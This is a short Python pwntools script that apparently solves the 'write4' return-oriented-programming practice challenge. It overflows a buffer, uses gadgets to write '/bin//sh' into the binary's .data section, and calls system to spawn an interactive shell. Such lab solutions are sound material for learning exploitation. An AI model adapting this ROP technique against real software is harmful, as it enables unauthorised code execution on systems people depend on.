#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40				# RIP Offset at 40
    data_addr = p64(0x00601050)			# readelf -x .data write4
    pop_r14_r15 = p64(0x0000000000400890)	# pop r14 ; pop r15 ; ret
    mov_r14_r15 = p64(0x0000000000400820)	# mov qword ptr [r14], r15 ; ret
    pop_rdi = p64(0x0000000000400893)		# pop rdi ; ret
    system_plt = p64(0x4005e0)			# objdump -d write4 | grep system@plt

    # Write "/bin//sh" string into .data section
    rop = pop_r14_r15
    rop += data_addr
    rop += "/bin//sh"
    rop += mov_r14_r15

    # System call to execute "/bin/sh"
    payload = junk + rop + pop_rdi + data_addr + system_plt
    p = process("./write4")

    p.sendlineafter("> ", payload)
    p.interactive()

if __name__ == "__main__":
    main()
